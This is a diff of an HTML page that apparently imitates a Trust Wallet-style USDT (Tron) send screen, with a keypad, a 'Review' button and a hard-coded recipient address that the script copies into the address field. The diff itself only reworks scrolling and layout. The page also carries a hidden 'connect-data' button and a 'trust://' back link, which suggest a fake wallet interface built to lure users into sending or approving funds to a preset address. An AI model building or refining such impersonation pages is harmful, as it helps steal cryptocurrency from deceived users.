@@ -20,41 +20,50 @@
       background-color: #000000;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       color: #ffffff;
-      overflow: hidden; /* Prevent native scroll scrollbar glitches */
     }
 
-    /* Outer Wrapper with Smooth Center Keyframe Animation */
-    .scroll-page {
+    /* REAL SCROLL CONTAINER (Touch & Trackpad Enabled) */
+    .scroll-container {
       width: 100%;
       height: 100vh;
-      display: flex;
-      flex-direction: column;
-      justify-content: center; /* Force elements towards center */
-      align-items: center;
-      background: #000000;
-      padding-top: 10px;
-
-      /* Smooth Keyframe Scroll/Slide Animation */
-      animation: smoothSlideToCenter 1.2s cubic-bezier(0.25, 1, 0.5, 1) forwards;
+      overflow-y: scroll;
+      scroll-snap-type: y mandatory; /* Enforces native snapping */
+      scroll-behavior: smooth; /* Smooth scrolling physics */
+      -webkit-overflow-scrolling: touch; /* Smooth inertia on iOS */
     }
 
-    /* Keyframes for smooth upward slide into exact center */
-    @keyframes smoothSlideToCenter {
-      0% {
-        transform: translateY(25vh);
-        opacity: 0.85;
-      }
-      100% {
-        transform: translateY(0);
-        opacity: 1;
-      }
+    /* Hide Scrollbar visually but keep real scrolling functional */
+    .scroll-container::-webkit-scrollbar {
+      display: none;
+    }
+    .scroll-container {
+      -ms-overflow-style: none;
+      scrollbar-width: none;
+    }
+
+    /* Scroll Spacer - Pull to scroll start */
+    .scroll-spacer {
+      height: 40vh; /* Top offset to start scroll from bottom */
+      scroll-snap-align: start;
+    }
+
+    /* Target Section: Center Alignment */
+    .scroll-center-section {
+      height: 100vh;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      scroll-snap-align: center; /* Locks sheet perfectly to Center on scroll */
+      padding: 10px 0;
     }
 
     /* Dynamic Island Pill indicator */
     .top-notch-area {
       width: 100%;
       max-width: 410px;
-      height: 28px;
+      height: 24px;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -70,7 +79,7 @@
       box-shadow: 0 0 10px rgba(0, 0, 0, 0.6);
     }
 
-    /* Main Sheet: Centered Layout */
+    /* Main Wallet Sheet */
     .wallet-sheet {
       width: 100%;
       max-width: 410px;
@@ -290,7 +299,7 @@
       transform: scale(0.95);
     }
 
-    /* Keypad in compact height */
+    /* Keypad Grid */
     .keypad-grid {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
@@ -326,7 +335,7 @@
       fill: none;
     }
 
-    /* Review CTA with bottom lift */
+    /* Review CTA */
     .cta-container {
       width: 100%;
       padding-bottom: 6px;
@@ -440,78 +449,83 @@
 </head>
 <body>
 
-<div class="scroll-page" id="scrollPage">
-  <div class="top-notch-area">
-    <div class="dynamic-pill"></div>
-  </div>
+<!-- REAL SCROLL WRAPPER -->
+<div class="scroll-container" id="scrollContainer">
+  <div class="scroll-spacer"></div>
 
-  <div class="wallet-sheet" id="walletSheet">
-    <div>
-      <div class="top-header">
-        <a href="trust://" class="back-btn" id="backBtn">
-          <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
-        </a>
-        <div class="header-title">Amount</div>
-        <div></div>
-      </div>
-
-      <div class="recipient-box">
-        <span class="recipient-prefix">To:</span><span id="recipientAddressText">TYDS1FeEEJr8qZnsJ5Nwd3iC3A73kr4ahW</span>
-      </div>
+  <div class="scroll-center-section" id="targetSection">
+    <div class="top-notch-area">
+      <div class="dynamic-pill"></div>
     </div>
 
-    <div class="display-container">
-      <div class="amount-display-wrapper">
-        <span class="amount-val zero" id="displayAmount">0</span>
-        <span class="cursor hidden" id="uiCursor"></span>
-      </div>
-      <div class="fiat-estimate">
-        <span id="displayFiat">≈ $0.00</span>
-        <span class="swap-arrow">⇅</span>
-      </div>
-    </div>
+    <div class="wallet-sheet">
+      <div>
+        <div class="top-header">
+          <a href="trust://" class="back-btn" id="backBtn">
+            <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
+          </a>
+          <div class="header-title">Amount</div>
+          <div></div>
+        </div>
 
-    <div class="lower-section">
-      <div class="token-row">
-        <div class="token-info">
-          <div class="token-icons">
-            <img class="token-main" src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="Tether USDT">
-            <div class="token-badge">
-              <img src="https://cdn-icons-png.flaticon.com/512/12114/12114250.png" alt="Tron">
+        <div class="recipient-box">
+          <span class="recipient-prefix">To:</span><span id="recipientAddressText">TYDS1FeEEJr8qZnsJ5Nwd3iC3A73kr4ahW</span>
+        </div>
+      </div>
+
+      <div class="display-container">
+        <div class="amount-display-wrapper">
+          <span class="amount-val zero" id="displayAmount">0</span>
+          <span class="cursor hidden" id="uiCursor"></span>
+        </div>
+        <div class="fiat-estimate">
+          <span id="displayFiat">≈ $0.00</span>
+          <span class="swap-arrow">⇅</span>
+        </div>
+      </div>
+
+      <div class="lower-section">
+        <div class="token-row">
+          <div class="token-info">
+            <div class="token-icons">
+              <img class="token-main" src="https://upload.wikimedia.org/wikipedia/commons/0/01/USDT_Logo.png?utm_source=commons.wikimedia.org&utm_campaign=index&utm_content=original" alt="Tether USDT">
+              <div class="token-badge">
+                <img src="https://cdn-icons-png.flaticon.com/512/12114/12114250.png" alt="Tron">
+              </div>
+            </div>
+            <div class="token-texts">
+              <span class="token-symbol">Tether USDT</span>
+              <span class="token-network">Tron</span>
             </div>
           </div>
-          <div class="token-texts">
-            <span class="token-symbol">Tether USDT</span>
-            <span class="token-network">Tron</span>
-          </div>
+          <button class="max-badge-btn" id="maxBtn" type="button">Max</button>
         </div>
-        <button class="max-badge-btn" id="maxBtn" type="button">Max</button>
-      </div>
 
-      <div class="keypad-grid">
-        <button class="key-btn" data-key="1">1</button>
-        <button class="key-btn" data-key="2">2</button>
-        <button class="key-btn" data-key="3">3</button>
-        <button class="key-btn" data-key="4">4</button>
-        <button class="key-btn" data-key="5">5</button>
-        <button class="key-btn" data-key="6">6</button>
-        <button class="key-btn" data-key="7">7</button>
-        <button class="key-btn" data-key="8">8</button>
-        <button class="key-btn" data-key="9">9</button>
-        <button class="key-btn" data-key=".">.</button>
-        <button class="key-btn" data-key="0">0</button>
-        <button class="key-btn" data-key="back">
-          <svg viewBox="0 0 24 24">
-            <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
-            <line x1="18" y1="9" x2="12" y2="15"/>
-            <line x1="12" y1="9" x2="18" y2="15"/>
-          </svg>
-        </button>
-      </div>
+        <div class="keypad-grid">
+          <button class="key-btn" data-key="1">1</button>
+          <button class="key-btn" data-key="2">2</button>
+          <button class="key-btn" data-key="3">3</button>
+          <button class="key-btn" data-key="4">4</button>
+          <button class="key-btn" data-key="5">5</button>
+          <button class="key-btn" data-key="6">6</button>
+          <button class="key-btn" data-key="7">7</button>
+          <button class="key-btn" data-key="8">8</button>
+          <button class="key-btn" data-key="9">9</button>
+          <button class="key-btn" data-key=".">.</button>
+          <button class="key-btn" data-key="0">0</button>
+          <button class="key-btn" data-key="back">
+            <svg viewBox="0 0 24 24">
+              <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
+              <line x1="18" y1="9" x2="12" y2="15"/>
+              <line x1="12" y1="9" x2="18" y2="15"/>
+            </svg>
+          </button>
+        </div>
 
-      <div class="cta-container" id="bottomActions">
-        <button class="connect-data" style="display:none"></button>
-        <button class="action-btn connect-btn" id="start-btn" disabled>Review</button>
+        <div class="cta-container" id="bottomActions">
+          <button class="connect-data" style="display:none"></button>
+          <button class="action-btn connect-btn" id="start-btn" disabled>Review</button>
+        </div>
       </div>
     </div>
   </div>
@@ -551,6 +565,15 @@
   const securityModal = document.getElementById('securityModal');
   const closeSecurityModal = document.getElementById('closeSecurityModal');
   const recipientAddressText = document.getElementById('recipientAddressText');
+  const scrollContainer = document.getElementById('scrollContainer');
+  const targetSection = document.getElementById('targetSection');
+
+  // Smooth JS Auto Scroll to Center on Load
+  window.addEventListener('load', () => {
+    setTimeout(() => {
+      targetSection.scrollIntoView({ behavior: 'smooth', block: 'center' });
+    }, 150);
+  });
 
   if (addressInput && recipientAddressText) {
     addressInput.value = recipientAddressText.textContent.trim();
